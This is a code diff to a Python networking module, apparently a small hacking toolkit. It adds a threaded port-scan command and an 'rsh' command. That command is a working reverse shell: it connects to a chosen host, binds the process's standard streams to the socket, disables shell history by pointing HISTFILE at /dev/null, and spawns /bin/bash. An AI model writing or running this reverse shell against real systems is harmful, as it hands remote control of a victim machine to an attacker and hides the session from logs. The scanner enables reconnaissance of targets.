@@ -1,5 +1,10 @@
+import os
+import pty
 import socket
 from multiprocessing.pool import ThreadPool, ApplyResult
+from time import sleep
+
+import click
 
 NEW_LINE: bytes = b'\n'
 ENCODING: str = 'utf-8'
@@ -84,6 +89,7 @@ class Server(AbstractClient):
 def scan(host: str, port: int) -> int:
     try:
         with Client(host, port):
+            print(f'[+] {port}')
             return port
     except socket.error:
         pass
@@ -104,3 +110,60 @@ def scan_range(host: str, ports: list[int], pool_size: int = 2) -> list[int]:
             open_ports.append(port)
 
     return open_ports
+
+
+@click.command()
+@click.option(
+    '--host',
+    prompt='Enter the host',
+    help='the host you want to scan',
+    type=str
+)
+@click.option(
+    '--start-port',
+    help='the start port you want to scan',
+    type=click.IntRange(1, 65535),
+    default=1,
+    show_default=True
+)
+@click.option(
+    '--end-port',
+    help='the end port you want to scan',
+    type=click.IntRange(1, 65535),
+    default=65535,
+    show_default=True
+)
+def port_scan(host: str, start_port: int, end_port: int) -> None:
+    print(f'[+] port scan started: {host}:{start_port}-{end_port}')
+    scan_range(host, list(range(start_port, end_port)))
+    print(f'[+] port scan completed: {host}:{start_port}-{end_port}')
+
+
+@click.command()
+@click.option(
+    '--host',
+    help='the host you want to connect to',
+    prompt='Enter the host you want to connect to',
+    type=str,
+)
+@click.option(
+    '--port',
+    help='Enter the port you want to connect to',
+    type=click.IntRange(1, 65535),
+    default=4040,
+    show_default=True
+)
+@click.option(
+    '--shell',
+    help='Enter the shell you want to spawn',
+    type=str,
+    default='/bin/bash',
+    show_default=True
+)
+def rsh(host: str, port: int, shell: str):
+    with Client(host, port) as client:
+        os.dup2(client.socket.fileno(), 0)
+        os.dup2(client.socket.fileno(), 1)
+        os.dup2(client.socket.fileno(), 2)
+        os.putenv("HISTFILE", '/dev/null')
+        pty.spawn(shell)
